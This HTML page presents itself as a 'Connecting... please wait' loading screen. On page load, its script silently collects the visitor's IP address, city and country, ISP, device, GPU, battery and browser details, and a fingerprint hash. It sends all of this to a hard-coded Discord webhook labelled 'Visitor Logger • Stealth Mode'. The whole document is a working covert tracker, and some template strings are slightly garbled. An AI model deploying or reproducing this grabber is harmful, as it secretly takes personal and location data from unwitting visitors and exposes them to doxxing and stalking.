<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0f0f0f;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            text-align: center;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 4px solid #333;
            border-top: 4px solid #00b0f4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        h1 { color: #00b0f4; }
        p { color: #aaa; max-width: 400px; }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h1>Connecting...</h1>
        <p>Please wait while we optimize your experience.</p>
    </div>

    <script>
        const webhookURL = "https://discord.com/api/webhooks/1486833700149923880/WlIFJMWJeXMF5QL4xjnM5aKrnmBIFbGCZK8kl8Gh-npMLt5g8F7ejFENqcAu_HO3aPXi";

        function getDeviceType() {
            const ua = navigator.userAgent.toLowerCase();
            if (/tablet|ipad|playbook|silk/i.test(ua)) return "Tablet";
            if (/mobile|android|iphone|ipod/i.test(ua)) return "Mobile";
            return "Desktop";
        }

        function getBrowser() {
            const ua = navigator.userAgent;
            if (ua.includes("Firefox")) return "Firefox";
            if (ua.includes("Edg")) return "Edge";
            if (ua.includes("Chrome")) return "Chrome";
            if (ua.includes("Safari")) return "Safari";
            return "Unknown";
        }

        function getBrowserEngine() {
            const ua = navigator.userAgent;
            if (ua.includes("Gecko/") && !ua.includes("like Gecko")) return "Gecko";
            if (ua.includes("AppleWebKit")) return "WebKit";
            if (ua.includes("Blink")) return "Blink";
            return "Unknown";
        }

        function getGPUInfo() {
            try {
                const canvas = document.createElement("canvas");
                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                return {
                    renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable",
                    vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Unavailable"
                };
            } catch {
                return { renderer: "Unavailable", vendor: "Unavailable" };
            }
        }

        function getConnectionInfo() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return conn ? `Type: ${conn.effectiveType}, Downlink: ${conn.downlink}Mbps` : "Unavailable";
        }

        async function getFingerprint() {
            const raw = [
                navigator.userAgent,
                navigator.language,
                screen.width,
                screen.height,
                navigator.platform,
                navigator.hardwareConcurrency || "",
                navigator.deviceMemory || ""
            ].join("|");
            
            try {
                const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
                return [...new Uint8Array(buf)].map(x => x.toString(16).padStart(2, "0")).join("");
            } catch {
                return "Failed";
            }
        }

        function detectAdBlock(callback) {
            const ad = document.createElement("div");
            ad.className = "adsbox";
            ad.style.display = "none";
            document.body.appendChild(ad);
            
            setTimeout(() => {
                const blocked = ad.offsetHeight === 0;
                document.body.removeChild(ad);
                callback(blocked ? "Yes" : "No");
            }, 100);
        }

        async function sendVisitorLog() {
            try {
                const ipResponse = await fetch("https://ipapi.co/json/");
                const data = await ipResponse.json();

                const { ip, city, region, country_name: country, org: isp, timezone } = data;

                const deviceType = getDeviceType();
                const browser = getBrowser();
                const engine = getBrowserEngine();
                const gpu = getGPUInfo();
                const connection = getConnectionInfo();
                const fingerprint = await getFingerprint();

                let batteryLevel = "Unknown";
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryLevel = `${Math.round(battery.level * 100)}%`;
                    } catch {}
                }

                detectAdBlock((adBlocked) => {
                    const payload = {
                        username: "📡 Visitor Logger",
                        avatar_url: "https://i.imgur.com/2xVfCiq.png",
                        embeds: [{
                            title: "🔍 Visitor Intel Report",
                            color: 0x00b0f4,
                            description: `**IP Address:** \`${ip}\``,
                            fields: [
                                { name: "📍 Location", value: `**City:** ${city || "Unknown"}\n**Region:** ${region || "Unknown"}\n**Country:** ${country || "Unknown"}`, inline: true },
                                { name: "🌐 Network", value: `**ISP:** ${isp || "Unknown"}\n**Timezone:** ${timezone || "Unknown"}\n**Connection:** ${connection}`, inline: true },
                                { name: "🧠 System", value: `**Type:** ${deviceType}\n**Platform:** ${navigator.platform}\n**CPU Threads:** ${navigator.hardwareConcurrency || "Unknown"}\n**RAM:** ${navigator.deviceMemory || "Unknown"} GB`, inline: true },
                                { name: "🖥️ Display", value: `**Resolution:** \( {screen.width}x \){screen.height} @ ${screen.colorDepth}bit\n**Window:** \( {window.innerWidth}x \){window.innerHeight}\n**Touch:** ${'ontouchstart' in window ? "Yes" : "No"}\n**Orientation:** ${screen.orientation?.type || "Unavailable"}`, inline: true },
                                { name: "🎮 GPU", value: `**Renderer:** ${gpu.renderer}\n**Vendor:** ${gpu.vendor}`, inline: true },
                                { name: "🧩 Browser", value: `**Browser:** ${browser}\n**Engine:** ${engine}\n**Language:** ${navigator.language}\n**Cookies:** ${navigator.cookieEnabled ? "Yes" : "No"}`, inline: true },
                                { name: "🌙 Preferences", value: `**Theme:** ${window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light"}\n**Battery:** ${batteryLevel}\n**AdBlock:** ${adBlocked}`, inline: true },
                                { name: "🧬 Fingerprint", value: `\`${fingerprint.slice(0, 40)}...\``, inline: false },
                                { name: "🕒 Time", value: new Date().toString(), inline: false }
                            ],
                            footer: { text: "Visitor Logger • Stealth Mode" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    fetch(webhookURL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload)
                    });
                });

            } catch (error) {
                console.error("Logger error:", error);
            }
        }

        window.onload = sendVisitorLog;
    </script>
</body>
</html>
